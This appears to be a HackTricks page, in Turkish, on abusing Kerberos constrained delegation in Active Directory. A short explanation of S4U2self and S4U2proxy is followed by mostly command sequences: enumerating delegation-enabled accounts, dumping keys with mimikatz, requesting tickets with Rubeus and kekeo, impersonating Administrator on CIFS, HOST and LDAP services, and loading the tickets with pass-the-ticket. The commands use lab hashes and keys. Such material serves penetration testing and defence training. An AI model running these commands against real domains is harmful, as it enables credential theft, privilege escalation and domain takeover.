# Kısıtlı Delegasyon

{{#include ../../banners/hacktricks-training.md}}

## Kısıtlı Delegasyon

Bunu kullanarak bir Domain yöneticisi, bir bilgisayarın bir **kullanıcı veya bilgisayarı** bir makinenin **hizmeti** karşısında **taklit etmesine** **izin verebilir**.

- **Kullanıcı için Hizmet (**_**S4U2self**_**):** Eğer bir **hizmet hesabı** _userAccountControl_ değeri [TRUSTED_TO_AUTH_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) içeriyorsa, o zaman kendisi (hizmet) adına herhangi bir kullanıcı için bir TGS alabilir.
- **Kullanıcı için Proxy Hizmeti (**_**S4U2proxy**_**):** Bir **hizmet hesabı**, **msDS-AllowedToDelegateTo**'da ayarlanan hizmet için herhangi bir kullanıcı adına bir TGS alabilir. Bunu yapmak için, önce o kullanıcıdan kendisine bir TGS alması gerekir, ancak diğerini talep etmeden önce bu TGS'yi elde etmek için S4U2self kullanabilir.

**Not**: Eğer bir kullanıcı AD'de ‘_Hesap hassas ve devredilemez_’ olarak işaretlenmişse, onu **taklit edemezsiniz**.

Bu, eğer **hizmetin hash'ini ele geçirirseniz**, **kullanıcıları taklit edebileceğiniz** ve onların adına **hizmete erişim** elde edebileceğiniz anlamına gelir (mümkün **privesc**).

Ayrıca, **kullanıcının taklit edebileceği hizmete erişiminiz olmayacak, aynı zamanda herhangi bir hizmete** de erişiminiz olacak çünkü SPN (istenen hizmet adı) kontrol edilmemektedir, yalnızca ayrıcalıklar kontrol edilmektedir. Bu nedenle, eğer **CIFS hizmetine** erişiminiz varsa, Rubeus'ta `/altservice` bayrağını kullanarak **HOST hizmetine** de erişiminiz olabilir.

Ayrıca, **DC'deki LDAP hizmet erişimi**, bir **DCSync**'i istismar etmek için gereklidir.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Bilgisayarda SYSTEM olmadan **TGT bileti** veya **RC4** ya da **AES256** elde etmenin **başka yolları** vardır; bunlar arasında Yazıcı Hatası, kısıtlanmamış delegasyon, NTLM ile iletim ve Active Directory Sertifika Servisi istismarı bulunmaktadır.
>
> **Sadece bu TGT biletine (veya hash'ine) sahip olarak, tüm bilgisayarı tehlikeye atmadan bu saldırıyı gerçekleştirebilirsiniz.**
```bash:Using Rubeus
#Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

#Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Daha fazla bilgi için ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

{{#include ../../banners/hacktricks-training.md}}
